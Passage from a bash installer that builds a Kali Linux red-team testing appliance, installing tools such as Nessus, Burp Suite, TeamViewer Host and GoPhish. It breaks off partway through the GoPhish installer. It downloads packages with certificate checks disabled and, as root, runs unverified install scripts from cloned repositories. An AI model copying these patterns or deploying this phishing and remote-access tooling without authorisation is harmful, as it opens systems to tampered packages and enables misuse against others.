#!/bin/bash
################################################################################
# Enhanced RTA Deployment Script v4.0
################################################################################
# Production-grade Kali Linux RTA deployment system with comprehensive error
# handling, parallel processing, dry-run mode, and BloodHound CE integration
################################################################################

set -euo pipefail

# Enable job control
set -m

################################################################################
# CONSTANTS & CONFIGURATION
################################################################################

readonly VERSION="4.0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_DIR

# Deployment directories
readonly DEPLOY_DIR="/opt/rta-deployment"
readonly TOOLS_DIR="/opt/security-tools"
readonly LOG_DIR="${DEPLOY_DIR}/logs"
readonly CONFIG_DIR="${DEPLOY_DIR}/config"
readonly DOWNLOAD_DIR="${DEPLOY_DIR}/downloads"
readonly TEMP_DIR="${DEPLOY_DIR}/temp"
readonly SYSTEM_STATE_DIR="${TOOLS_DIR}/system-state"
readonly HELPERS_DIR="${TOOLS_DIR}/helpers"
readonly SCRIPTS_DIR="${TOOLS_DIR}/scripts"

# Configuration and reference files
readonly CONFIG_FILE="${CONFIG_DIR}/config.yml"
readonly REFERENCE_DST="${TOOLS_DIR}/references"

# Logging
MAIN_LOG="${LOG_DIR}/deployment_$(date +%Y%m%d_%H%M%S).log"
_summary_ts="$(date +%Y%m%d_%H%M%S)"
readonly SUMMARY_FILE="${LOG_DIR}/deployment_summary_${_summary_ts}.txt"

# Color codes
readonly BOLD="\e[1m"
readonly RESET="\e[0m"
readonly GREEN="\e[32m"
readonly YELLOW="\e[33m"
readonly RED="\e[31m"
readonly BLUE="\e[34m"
readonly CYAN="\e[36m"
readonly MAGENTA="\e[35m"
readonly GRAY="\e[90m"

# Terminal width for formatting
TERM_WIDTH=$(tput cols 2>/dev/null || echo 80)
[[ $TERM_WIDTH -lt 80 ]] && TERM_WIDTH=80

# System configuration
AVAILABLE_CORES=$(grep -c processor /proc/cpuinfo)
readonly AVAILABLE_CORES
readonly PARALLEL_JOBS=$((AVAILABLE_CORES > 1 ? AVAILABLE_CORES - 1 : 1))
readonly MAX_PARALLEL=$((PARALLEL_JOBS > 8 ? 8 : PARALLEL_JOBS))

# Timeout settings (seconds)
readonly DEFAULT_TIMEOUT=120
readonly LONG_TIMEOUT=600
readonly SHORT_TIMEOUT=300

################################################################################
# RUNTIME CONFIGURATION (MUTABLE)
################################################################################

# Flags
AUTO_MODE=false
VERBOSE=false
FORCE_REINSTALL=false
SKIP_DOWNLOADS=false
SKIP_UPDATE=false
BACKUP_CONFIG=true
DRY_RUN=false
INTERACTIVE_MODE=true
DISPLAY_PROGRESS=true

# Installation modes
FULL_INSTALL=true
CORE_TOOLS_ONLY=false
DESKTOP_ONLY=false
REINSTALL_FAILED=false

# Repository configuration
GITHUB_REPO_URL="https://github.com/Richey-May-Cyber/RTABuilder.git"

# Store original arguments for error messages
ORIGINAL_ARGS="$*"

################################################################################
# TRAP AND ERROR HANDLING
################################################################################

# Trap errors and exit
trap cleanup EXIT INT TERM

cleanup() {
    local exit_code=$?

    log "STATUS" "Performing cleanup..."

    # Kill any background processes
    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null || true

    # Remove temporary files
    [[ -d "$TEMP_DIR" ]] && rm -rf "${TEMP_DIR:?}"/* 2>/dev/null || true

    # Create summary if deployment completed enough
    if [[ -d "$DEPLOY_DIR" && -d "$TOOLS_DIR" && $exit_code -ne 4 ]]; then
        create_summary || log "WARNING" "Failed to create summary"
    fi

    # Display final status
    display_final_status "$exit_code"

    exit "$exit_code"
}

display_final_status() {
    local exit_code=$1

    if [[ $exit_code -eq 0 ]]; then
        cat << EOF

${GREEN}==================================================================${RESET}
${GREEN}         RTA DEPLOYMENT COMPLETED SUCCESSFULLY${RESET}
${GREEN}==================================================================${RESET}

${BLUE}Logs saved to:${RESET} ${YELLOW}${LOG_DIR}${RESET}
${BLUE}Summary report:${RESET} ${YELLOW}${SUMMARY_FILE}${RESET}
${BLUE}Validation:${RESET} ${CYAN}sudo ${SCRIPTS_DIR}/validate-tools.sh${RESET}

${YELLOW}[!] Reboot recommended to complete setup${RESET}
EOF
    elif [[ $exit_code -eq 130 ]]; then
        log "WARNING" "Deployment interrupted by user"
    elif [[ $exit_code -eq 4 ]]; then
        log "WARNING" "Deployment aborted by user"
    else
        cat << EOF

${RED}==================================================================${RESET}
${RED}         RTA DEPLOYMENT ENCOUNTERED ERRORS${RESET}
${RED}==================================================================${RESET}

${BLUE}Check logs:${RESET} ${YELLOW}${MAIN_LOG}${RESET}
${CYAN}Retry:${RESET} ${YELLOW}sudo $0 --auto${RESET}
EOF
    fi
}

################################################################################
# LOGGING FUNCTIONS
################################################################################

log() {
    local level="$1"
    local message="$2"
    local color=""
    local prefix=""
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    case "$level" in
        "DEBUG")   color="$GRAY"; prefix="[D]" ;;
        "INFO")    color="$BLUE"; prefix="[i]" ;;
        "SUCCESS") color="$GREEN"; prefix="[✓]" ;;
        "WARNING") color="$YELLOW"; prefix="[!]" ;;
        "ERROR")   color="$RED"; prefix="[✗]" ;;
        "CRITICAL") color="${RED}${BOLD}"; prefix="[!!]" ;;
        "STATUS")  color="$CYAN"; prefix="[*]" ;;
        "HEADER")  color="${MAGENTA}${BOLD}"; prefix="[#]" ;;
        *)         color="$RESET"; prefix="[*]" ;;
    esac

    # Ensure log directory exists
    mkdir -p "$(dirname "$MAIN_LOG")" 2>/dev/null || true

    # Write to log file
    echo "$timestamp [$level] $message" >> "$MAIN_LOG" 2>/dev/null || true

    # Write to console
    if [[ "$level" != "DEBUG" ]] || $VERBOSE; then
        echo -e "${color}${prefix} ${message}${RESET}" >&2
    fi
}

################################################################################
# UTILITY FUNCTIONS
################################################################################

# Check if running as root
require_root() {
    if [[ $EUID -ne 0 ]]; then
        log "CRITICAL" "This script must be run as root"
        echo -e "${RED}[✗] Please run with sudo: sudo $0 ${ORIGINAL_ARGS}${RESET}" >&2
        exit 1
    fi
}

# Display banner
display_banner() {
    cat << EOF

${CYAN}==================================================================${RESET}
${CYAN}    KALI LINUX RTA DEPLOYMENT SYSTEM - Version ${VERSION}${RESET}
${CYAN}==================================================================${RESET}
${BLUE}A robust, automated deployment for security testing appliances${RESET}

EOF
}

# Parse command-line arguments
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --auto)
                AUTO_MODE=true
                INTERACTIVE_MODE=false
                shift
                ;;
            --dry-run)
                DRY_RUN=true
                log "INFO" "Running in DRY-RUN mode (no changes will be made)"
                shift
                ;;
            --verbose)
                VERBOSE=true
                shift
                ;;
            --force-reinstall)
                FORCE_REINSTALL=true
                shift
                ;;
            --skip-downloads)
                SKIP_DOWNLOADS=true
                shift
                ;;
            --skip-update)
                SKIP_UPDATE=true
                shift
                ;;
            --core-only)
                CORE_TOOLS_ONLY=true
                FULL_INSTALL=false
                shift
                ;;
            --desktop-only)
                DESKTOP_ONLY=true
                FULL_INSTALL=false
                shift
                ;;
            --interactive)
                INTERACTIVE_MODE=true
                AUTO_MODE=false
                shift
                ;;
            --reinstall-failed)
                REINSTALL_FAILED=true
                FORCE_REINSTALL=true
                shift
                ;;
            --repo)
                shift
                if [[ $# -gt 0 ]]; then
                    GITHUB_REPO_URL="$1"
                    log "INFO" "Using custom repository: $GITHUB_REPO_URL"
                    shift
                else
                    log "ERROR" "No repository URL provided"
                    exit 1
                fi
                ;;
            --help)
                show_help
                exit 0
                ;;
            *)
                log "ERROR" "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
}

# Show help message
show_help() {
    cat << EOF
Usage: $0 [OPTIONS]

Options:
  --auto                Fully automated mode (no prompts)
  --dry-run             Simulate installation without making changes
  --verbose             Show detailed output
  --force-reinstall     Force reinstallation of all tools
  --skip-downloads      Skip downloading resources
  --skip-update         Skip APT repository update
  --core-only           Install core tools only
  --desktop-only        Configure desktop environment only
  --interactive         Interactive mode with prompts (default)
  --reinstall-failed    Reinstall only tools that failed
  --repo URL            Use custom GitHub repository
  --help                Show this help message

Examples:
  sudo $0 --auto                    # Full automated deployment
  sudo $0 --dry-run --verbose       # Test run with detailed output
  sudo $0 --core-only --interactive # Core tools only, interactive

EOF
}

# Interactive prompt
prompt_yes_no() {
    local question="$1"
    local default_yes="${2:-true}"

    if $AUTO_MODE; then
        return 0
    fi

    local prompt
    if [[ "$default_yes" == "true" ]]; then
        prompt="${question} [Y/n] "
    else
        prompt="${question} [y/N] "
    fi

    read -rp "$prompt" response

    if [[ "$default_yes" == "true" ]]; then
        [[ ! "$response" =~ ^[nN] ]]
    else
        [[ "$response" =~ ^[yY] ]]
    fi
}

# Get YAML config value robustly
get_config_value() {
    local yaml_file="$1"
    local key="$2"
    local default="${3:-}"

    if [[ ! -f "$yaml_file" ]]; then
        echo "$default"
        return 0
    fi

    # Try to extract value using grep and sed
    local value
    value=$(grep -E "^${key}:" "$yaml_file" 2>/dev/null | head -1 | cut -d':' -f2- | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | tr -d '"')

    # Return value or default
    [[ -n "$value" ]] && echo "$value" || echo "$default"
}

# Show spinner during long operations
show_spinner() {
    local pid=$1
    local message="$2"
    local delay=0.1
    local spinstr='⣾⣽⣻⢿⡿⣟⣯⣷'
    local temp_file
    temp_file=$(mktemp)

    if ! kill -0 "$pid" 2>/dev/null; then
        rm -f "$temp_file"
        return 0
    fi

    local max_msg_width=$((TERM_WIDTH - 10))
    local formatted_message="${message:0:$max_msg_width}"
    [[ ${#message} -gt $max_msg_width ]] && formatted_message="${formatted_message:0:$((max_msg_width-3))}..."

    echo "$pid" > "$temp_file"

    (
        while [[ -f "$temp_file" ]] && kill -0 "$pid" 2>/dev/null; do
            local temp="${spinstr#?}"
            local char="${spinstr%"$temp"}"
            spinstr="${temp}${char}"
            printf "\r${BLUE}[${YELLOW}%s${BLUE}]${RESET} %-${max_msg_width}s" "$char" "$formatted_message"
            sleep "$delay"
        done
        printf "\r%-$((TERM_WIDTH-1))s\r" " "
    ) &

    local spinner_pid=$!
    wait "$pid" 2>/dev/null
    local exit_status=$?

    rm -f "$temp_file"
    kill "$spinner_pid" 2>/dev/null || true
    wait "$spinner_pid" 2>/dev/null || true

    if [[ $exit_status -eq 0 ]]; then
        printf "\r${GREEN}[✓]${RESET} %-${max_msg_width}s\n" "$formatted_message"
    else
        printf "\r${RED}[✗]${RESET} %-${max_msg_width}s (error code: $exit_status)\n" "$formatted_message"
    fi

    return "$exit_status"
}

# Show progress bar
show_progress_bar() {
    local current=$1
    local total=$2
    local message="$3"
    local width=25
    local percent=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))

    local max_msg_width=$((TERM_WIDTH - width - 15))
    local formatted_message="${message:0:$max_msg_width}"
    [[ ${#message} -gt $max_msg_width ]] && formatted_message="${formatted_message:0:$((max_msg_width-3))}..."

    printf "\r%-${max_msg_width}s %3d%% " "$formatted_message" "$percent"
    printf "["
    for ((i=0; i<filled; i++)); do printf "="; done
    printf ">"
    for ((i=0; i<empty; i++)); do printf " "; done
    printf "]"

    if [[ $current -eq $total ]]; then
        echo ""
    fi
}

# Run command safely with timeout
run_command() {
    local cmd="$1"
    local description="$2"
    local timeout_duration="${3:-$DEFAULT_TIMEOUT}"
    local log_file
    log_file="${LOG_DIR}/$(echo "$description" | tr ' ' '_')_$(date +%Y%m%d_%H%M%S).log"

    log "DEBUG" "Running: $cmd"

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] $description"
        return 0
    fi

    mkdir -p "$LOG_DIR"

    timeout "$timeout_duration" bash -c "$cmd" > "$log_file" 2>&1 &
    local cmd_pid=$!

    if $DISPLAY_PROGRESS; then
        show_spinner "$cmd_pid" "$description"
        local result=$?
    else
        wait "$cmd_pid" 2>/dev/null
        local result=$?
    fi

    if [[ $result -eq 0 ]]; then
        log "SUCCESS" "$description completed"
        return 0
    elif [[ $result -eq 124 ]] || [[ $result -eq 143 ]]; then
        log "ERROR" "$description timed out after $timeout_duration seconds"
        return 1
    else
        log "ERROR" "$description failed with exit code $result"
        return 1
    fi
}

################################################################################
# SYSTEM CHECKS
################################################################################

check_dependencies() {
    log "STATUS" "Checking system dependencies..."

    local dependencies=("curl" "wget" "git" "bc" "unzip" "python3")
    local missing=()

    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        log "WARNING" "Missing dependencies: ${missing[*]}"
        log "STATUS" "Installing missing dependencies..."

        if $DRY_RUN; then
            log "STATUS" "[DRY-RUN] Would install: ${missing[*]}"
            return 0
        fi

        apt-get update -qq || {
            log "ERROR" "Failed to update APT repositories"
            return 1
        }

        DEBIAN_FRONTEND=noninteractive apt-get install -y "${missing[@]}" &>/dev/null || {
            log "CRITICAL" "Failed to install required dependencies"
            return 1
        }

        log "SUCCESS" "Dependencies installed"
    else
        log "SUCCESS" "All dependencies present"
    fi

    return 0
}

check_system_resources() {
    log "STATUS" "Checking system resources..."

    # Check disk space
    local available_space
    available_space=$(df -BM "$DEPLOY_DIR" 2>/dev/null | awk 'NR==2 {print $4}' | sed 's/M//')

    if [[ $available_space -lt 5000 ]]; then
        log "WARNING" "Low disk space: ${available_space}MB (10GB recommended)"
        if [[ $available_space -lt 2000 ]]; then
            log "CRITICAL" "Insufficient disk space: ${available_space}MB"
            if ! prompt_yes_no "Continue anyway?" false; then
                exit 4
            fi
        fi
    else
        log "SUCCESS" "Sufficient disk space: ${available_space}MB"
    fi

    # Check RAM
    local total_ram
    total_ram=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')

    if [[ $total_ram -lt 2048 ]]; then
        log "WARNING" "Low RAM: ${total_ram}MB (2GB recommended)"
    else
        log "SUCCESS" "Sufficient memory: ${total_ram}MB"
    fi

    return 0
}

################################################################################
# DIRECTORY AND CONFIG SETUP
################################################################################

create_directories() {
    log "STATUS" "Creating required directories..."

    local dirs=(
        "$DEPLOY_DIR"
        "$TOOLS_DIR"
        "$LOG_DIR"
        "$CONFIG_DIR"
        "$DOWNLOAD_DIR"
        "$TEMP_DIR"
        "$SYSTEM_STATE_DIR"
        "$HELPERS_DIR"
        "$SCRIPTS_DIR"
        "${TOOLS_DIR}/bin"
        "${TOOLS_DIR}/desktop"
        "${TOOLS_DIR}/venvs"
        "$REFERENCE_DST"
    )

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would create directories: ${#dirs[@]} dirs"
        return 0
    fi

    for dir in "${dirs[@]}"; do
        mkdir -p "$dir" || {
            log "ERROR" "Failed to create directory: $dir"
            continue
        }
    done

    chmod 755 "$DEPLOY_DIR" "$TOOLS_DIR" "$HELPERS_DIR" "$SCRIPTS_DIR" "${TOOLS_DIR}/bin" 2>/dev/null || true

    log "SUCCESS" "Directories created"
    return 0
}

backup_config() {
    if [[ -f "$CONFIG_FILE" && "$BACKUP_CONFIG" == "true" && ! "$DRY_RUN" == "true" ]]; then
        log "INFO" "Backing up existing configuration..."
        cp "$CONFIG_FILE" "${CONFIG_FILE}.backup.$(date +%Y%m%d%H%M%S)" || {
            log "WARNING" "Failed to backup configuration"
        }
    fi
}

ensure_config() {
    if [[ ! -f "$CONFIG_FILE" || "$FORCE_REINSTALL" == "true" ]]; then
        log "INFO" "Setting up configuration..."

        if $DRY_RUN; then
            log "STATUS" "[DRY-RUN] Would create config at: $CONFIG_FILE"
            return 0
        fi

        mkdir -p "$CONFIG_DIR"

        # Copy config from repository or create default
        if [[ -f "${SCRIPT_DIR}/config.yml" ]]; then
            cp "${SCRIPT_DIR}/config.yml" "$CONFIG_FILE"
        elif [[ -f "${DEPLOY_DIR}/installer/config.yml" ]]; then
            cp "${DEPLOY_DIR}/installer/config.yml" "$CONFIG_FILE"
        else
            log "WARNING" "No config.yml found, using defaults"
        fi

        log "SUCCESS" "Configuration ready"
    fi

    return 0
}

################################################################################
# APT PACKAGE INSTALLATION
################################################################################

install_apt_packages() {
    local package_list="$1"

    if [[ -z "$package_list" ]]; then
        log "INFO" "No APT packages to install"
        return 0
    fi

    # Parse package list
    local -a packages
    IFS=',' read -ra packages <<< "$package_list"

    local total=${#packages[@]}
    log "HEADER" "Installing $total APT packages..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would install APT packages: ${packages[*]:0:3}... ($total total)"
        return 0
    fi

    # Update repositories if needed
    if ! $SKIP_UPDATE; then
        log "STATUS" "Updating APT repositories..."
        apt-get update -qq || log "WARNING" "Failed to update repositories"
    fi

    local current=0
    local success=0
    local failed=0

    # Use parallel if available and beneficial
    if command -v parallel &>/dev/null && [[ $total -gt 10 ]]; then
        log "INFO" "Using parallel installation ($MAX_PARALLEL jobs)"

        install_apt_single() {
            local pkg="$1"
            # Check if installed (unless force reinstall)
            if [[ "$FORCE_REINSTALL" != "true" ]] && dpkg -l 2>/dev/null | grep -q "^ii.*$pkg "; then
                return 0
            fi
            DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" &>/dev/null
        }
        export -f install_apt_single
        export FORCE_REINSTALL
        export DEBIAN_FRONTEND

        printf '%s\n' "${packages[@]}" | parallel --no-notice -j "$MAX_PARALLEL" install_apt_single {}
        success=$((total - failed))
    else
        # Sequential installation
        for pkg in "${packages[@]}"; do
            ((current++))
            show_progress_bar "$current" "$total" "Installing $pkg"

            # Check if already installed
            if [[ "$FORCE_REINSTALL" != "true" ]] && dpkg -l 2>/dev/null | grep -q "^ii.*$pkg "; then
                log "DEBUG" "$pkg already installed"
                ((success++))
                continue
            fi

            # Install package
            if DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" &>/dev/null; then
                log "DEBUG" "Installed: $pkg"
                ((success++))
            else
                log "WARNING" "Failed to install: $pkg"
                ((failed++))
            fi
        done
    fi

    # Fix any broken dependencies
    apt-get -f install -y &>/dev/null || true

    log "STATUS" "APT installation: $success/$total successful, $failed failed"
    return $((failed > 0 ? 1 : 0))
}

################################################################################
# PIPX PACKAGE INSTALLATION
################################################################################

install_pipx_packages() {
    local package_list="$1"

    if [[ -z "$package_list" ]]; then
        log "INFO" "No PIPX packages to install"
        return 0
    fi

    # Parse package list
    local -a packages
    IFS=',' read -ra packages <<< "$package_list"

    local total=${#packages[@]}
    log "HEADER" "Installing $total PIPX packages..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would install PIPX packages: ${packages[*]:0:3}... ($total total)"
        return 0
    fi

    # Ensure pipx is installed
    if ! command -v pipx &>/dev/null; then
        log "STATUS" "Installing pipx..."
        apt-get install -y python3-pip python3-venv &>/dev/null || {
            log "ERROR" "Failed to install python3 dependencies"
            return 1
        }
        python3 -m pip install --quiet --user pipx || {
            log "ERROR" "Failed to install pipx"
            return 1
        }
        export PATH="${HOME}/.local/bin:$PATH"
    fi

    local current=0
    local success=0
    local failed=0

    for pkg in "${packages[@]}"; do
        ((current++))
        show_progress_bar "$current" "$total" "Installing $pkg via pipx"

        # Check if already installed
        if [[ "$FORCE_REINSTALL" != "true" ]] && pipx list 2>/dev/null | grep -q "$pkg"; then
            log "DEBUG" "$pkg already installed"
            ((success++))
            continue
        fi

        # Uninstall if force reinstall
        if [[ "$FORCE_REINSTALL" == "true" ]]; then
            pipx uninstall "$pkg" &>/dev/null || true
        fi

        # Install package
        if pipx install "$pkg" &>/dev/null; then
            log "DEBUG" "Installed: $pkg"
            ((success++))
        else
            log "WARNING" "Failed to install: $pkg (will retry with --no-deps)"
            if pipx install "$pkg" --pip-args="--no-cache-dir --no-deps" &>/dev/null; then
                ((success++))
            else
                ((failed++))
            fi
        fi
    done

    log "STATUS" "PIPX installation: $success/$total successful, $failed failed"
    return $((failed > 0 ? 1 : 0))
}

################################################################################
# GIT REPOSITORY INSTALLATION
################################################################################

install_git_repos() {
    local repo_list="$1"

    if [[ -z "$repo_list" ]]; then
        log "INFO" "No Git repositories to install"
        return 0
    fi

    # Parse repo list
    local -a repos
    IFS=',' read -ra repos <<< "$repo_list"

    local total=${#repos[@]}
    log "HEADER" "Installing $total Git repositories..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would clone $total repositories"
        return 0
    fi

    if ! command -v git &>/dev/null; then
        log "STATUS" "Installing git..."
        apt-get install -y git &>/dev/null || {
            log "ERROR" "Failed to install git"
            return 1
        }
    fi

    local current=0
    local success=0
    local failed=0

    for repo_url in "${repos[@]}"; do
        ((current++))
        local repo_name
        repo_name=$(basename "$repo_url" .git)

        show_progress_bar "$current" "$total" "Cloning $repo_name"

        local repo_dir="${TOOLS_DIR}/${repo_name}"

        # Check if already cloned
        if [[ -d "${repo_dir}/.git" && "$FORCE_REINSTALL" != "true" ]]; then
            log "DEBUG" "Updating $repo_name"
            if cd "$repo_dir" && git pull -q &>/dev/null; then
                post_git_install "$repo_dir" "$repo_name"
                ((success++))
                continue
            else
                log "DEBUG" "Failed to update, recloning $repo_name"
                rm -rf "$repo_dir"
            fi
        fi

        # Clone repository
        if git clone --depth 1 --quiet "$repo_url" "$repo_dir" 2>/dev/null; then
            log "DEBUG" "Cloned: $repo_name"
            post_git_install "$repo_dir" "$repo_name"
            ((success++))
        else
            log "WARNING" "Failed to clone: $repo_name"
            ((failed++))
        fi
    done

    log "STATUS" "Git installation: $success/$total successful, $failed failed"
    return $((failed > 0 ? 1 : 0))
}

post_git_install() {
    local repo_dir="$1"
    local repo_name="$2"

    # Run setup.py if available
    if [[ -f "${repo_dir}/setup.py" ]]; then
        log "DEBUG" "Installing $repo_name with pip"
        cd "$repo_dir" && pip3 install -q -e . 2>/dev/null || true
    fi

    # Install requirements.txt if available
    if [[ -f "${repo_dir}/requirements.txt" ]]; then
        log "DEBUG" "Installing requirements for $repo_name"
        cd "$repo_dir" && pip3 install -q -r requirements.txt 2>/dev/null || true
    fi

    # Run install.sh if available
    if [[ -f "${repo_dir}/install.sh" ]]; then
        log "DEBUG" "Running install script for $repo_name"
        cd "$repo_dir" && bash install.sh &>/dev/null || true
    fi

    # Create symlink for main executable
    local main_script=""
    for ext in ".py" ".sh" ""; do
        for name in "main" "cli" "$repo_name" "run"; do
            if [[ -f "${repo_dir}/${name}${ext}" ]]; then
                main_script="${name}${ext}"
                break 2
            fi
        done
    done

    if [[ -n "$main_script" ]]; then
        chmod +x "${repo_dir}/${main_script}" || true
        ln -sf "${repo_dir}/${main_script}" "/usr/local/bin/${repo_name}" 2>/dev/null || true
    fi
}

################################################################################
# MANUAL TOOL INSTALLERS (INLINE)
################################################################################

install_nessus() {
    local tool_name="Nessus"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would download and install Nessus 10.8.4"
        log "STATUS" "[DRY-RUN] Would enable nessusd service on port 8834"
        return 0
    fi

    # Check if already installed
    if dpkg -l | grep -q "^ii.*nessus" || [[ -d "/opt/nessus" ]]; then
        log "INFO" "$tool_name appears to be already installed"
        if ! systemctl is-active --quiet nessusd 2>/dev/null; then
            log "STATUS" "Starting Nessus service..."
            systemctl start nessusd || log "WARNING" "Could not start Nessus service"
        fi
        log "SUCCESS" "$tool_name is already installed"
        return 0
    fi

    mkdir -p "$DOWNLOAD_DIR"
    cd "$DOWNLOAD_DIR" || return 1

    local nessus_version="10.8.4"
    local nessus_pkg="Nessus-${nessus_version}-ubuntu1604_amd64.deb"
    local nessus_url="https://www.tenable.com/downloads/api/v2/pages/nessus/files/${nessus_pkg}"

    log "STATUS" "Downloading Nessus..."
    if ! run_command "curl -k --request GET --url '$nessus_url' --output '$nessus_pkg'" "Download Nessus" "$LONG_TIMEOUT"; then
        log "WARNING" "Curl download failed, trying wget..."
        if ! run_command "wget --no-check-certificate --content-disposition --header='Accept: application/x-debian-package' --header='User-Agent: Mozilla/5.0 (X11; Linux x86_64)' '$nessus_url' -O '$nessus_pkg'" "Download Nessus with wget" "$LONG_TIMEOUT"; then
            log "ERROR" "$tool_name download failed"
            return 1
        fi
    fi

    if ! [[ -f "$nessus_pkg" ]] || ! dpkg-deb --info "$nessus_pkg" >/dev/null 2>&1; then
        log "ERROR" "Invalid Nessus package"
        return 1
    fi

    log "STATUS" "Installing Nessus package..."
    apt-get update -qq || true
    if ! dpkg -i "$nessus_pkg" >/dev/null 2>&1; then
        log "STATUS" "Fixing dependencies..."
        apt-get install -f -y >/dev/null 2>&1 || true
        dpkg -i "$nessus_pkg" >/dev/null 2>&1 || {
            log "ERROR" "Failed to install Nessus"
            return 1
        }
    fi

    log "STATUS" "Enabling and starting Nessus service..."
    systemctl enable nessusd >/dev/null 2>&1 || true
    systemctl start nessusd >/dev/null 2>&1 || true

    if systemctl is-active --quiet nessusd 2>/dev/null; then
        log "SUCCESS" "$tool_name installed and service started"
        log "INFO" "Access Nessus at: https://localhost:8834/"
    else
        log "WARNING" "$tool_name installed but service not running"
    fi

    rm -f "$nessus_pkg"
    return 0
}

install_teamviewer() {
    local tool_name="TeamViewer Host"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would download and install TeamViewer Host"
        log "STATUS" "[DRY-RUN] Would apply policykit fix and start daemon"
        return 0
    fi

    # Check if already installed
    if systemctl is-active --quiet teamviewerd 2>/dev/null; then
        log "SUCCESS" "$tool_name is already installed and running"
        return 0
    fi

    local tv_package="/tmp/teamviewer-host_amd64.deb"

    if [[ ! -f "$tv_package" ]]; then
        log "STATUS" "Downloading $tool_name..."
        if ! run_command "wget -q --show-progress https://download.teamviewer.com/download/linux/teamviewer-host_amd64.deb -O '$tv_package'" "Download TeamViewer" "$LONG_TIMEOUT"; then
            log "ERROR" "$tool_name download failed"
            return 1
        fi
    fi

    # Apply policykit fix (call existing function)
    fix_teamviewer_policykit || log "WARNING" "PolicyKit fix had issues"

    log "STATUS" "Installing $tool_name package..."
    apt-get update -qq || true
    if ! dpkg -i "$tv_package" >/dev/null 2>&1; then
        log "STATUS" "Fixing dependencies..."
        apt-get install -f -y >/dev/null 2>&1 || true
        dpkg -i "$tv_package" >/dev/null 2>&1 || {
            log "ERROR" "Failed to install $tool_name"
            return 1
        }
    fi

    log "STATUS" "Starting TeamViewer daemon..."
    systemctl start teamviewerd >/dev/null 2>&1 || true
    sleep 2

    # Create desktop entry
    mkdir -p "/usr/share/applications"
    cat > "/usr/share/applications/teamviewer.desktop" << 'DESKTOP'
[Desktop Entry]
Name=TeamViewer
Comment=Remote Control Application
Exec=teamviewer
Icon=/opt/teamviewer/tv_bin/desktop/teamviewer.png
Terminal=false
Type=Application
Categories=Network;RemoteAccess;
DESKTOP

    if systemctl is-active --quiet teamviewerd 2>/dev/null; then
        log "SUCCESS" "$tool_name installed and daemon started"
    else
        log "WARNING" "$tool_name installed but daemon not running"
    fi

    rm -f "$tv_package"
    return 0
}

install_burpsuite() {
    local tool_name="Burp Suite Community"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would download and install BurpSuite Community"
        log "STATUS" "[DRY-RUN] Would create desktop entry"
        return 0
    fi

    local burp_dir="/opt/BurpSuitePro"
    local download_dir="/opt/security-tools/downloads"

    # Check if already installed
    if [[ -f "$burp_dir/burpsuite_pro.jar" ]]; then
        log "SUCCESS" "$tool_name is already installed"
        return 0
    fi

    mkdir -p "$burp_dir" "$download_dir"

    # Verify Java is installed
    if ! command -v java &>/dev/null; then
        log "STATUS" "Installing Java..."
        apt-get update -qq || true
        apt-get install -y default-jre >/dev/null 2>&1 || {
            log "ERROR" "Failed to install Java"
            return 1
        }
    fi

    log "STATUS" "Downloading $tool_name..."
    local burp_url="https://portswigger-cdn.net/burp/releases/download?product=community&latest"
    local temp_file
    temp_file=$(mktemp)

    if ! run_command "wget -q --show-progress '$burp_url' -O '$temp_file'" "Download BurpSuite" "$LONG_TIMEOUT"; then
        log "ERROR" "$tool_name download failed"
        rm -f "$temp_file"
        return 1
    fi

    if [[ -f "$temp_file" ]] && [[ -s "$temp_file" ]]; then
        mv "$temp_file" "$download_dir/burpsuite_community.jar"
        cp "$download_dir/burpsuite_community.jar" "$burp_dir/burpsuite_pro.jar"
        chmod +x "$burp_dir/burpsuite_pro.jar"
    else
        log "WARNING" "$tool_name download appears to have failed, skipping"
        rm -f "$temp_file"
        return 1
    fi

    # Create wrapper script
    mkdir -p "/usr/bin"
    cat > "/usr/bin/burpsuite" << 'WRAPPER'
#!/bin/bash
java -Xmx2g -jar "/opt/BurpSuitePro/burpsuite_pro.jar" "$@"
WRAPPER
    chmod +x "/usr/bin/burpsuite"

    # Create desktop entry
    mkdir -p "/usr/share/applications"
    cat > "/usr/share/applications/burpsuite_pro.desktop" << 'DESKTOP'
[Desktop Entry]
Name=Burp Suite Community
GenericName=Web Security Tool
Comment=Web application security testing
Exec=burpsuite %U
Icon=burpsuite
Terminal=false
Type=Application
Categories=Security;Application;Network;
Keywords=security;web;scanner;proxy;
DESKTOP

    log "SUCCESS" "$tool_name installed"
    log "INFO" "Run with: burpsuite"
    return 0
}

install_gophish() {
    local tool_name="GoPhish"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would download and install GoPhish"
        log "STATUS" "[DRY-RUN] Would create systemd service"
        return 0
    fi

    local install_dir="/opt/security-tools/gophish"
    local download_dir="/opt/security-tools/downloads"

    # Check if already installed
    if [[ -f "$install_dir/gophish" ]]; then
        log "SUCCESS" "$tool_name is already installed"
        if systemctl is-active --quiet gophish 2>/dev/null; then
            log "INFO" "$tool_name service is running"
        fi
        return 0
    fi

    mkdir -p "$install_dir" "$download_dir"

    local gophish_version="0.12.1"
    local gophish_url="https://github.com/gophish/gophish/releases/download/v${gophish_version}/gophish-v${gophish_version}-linux-64bit.zip"
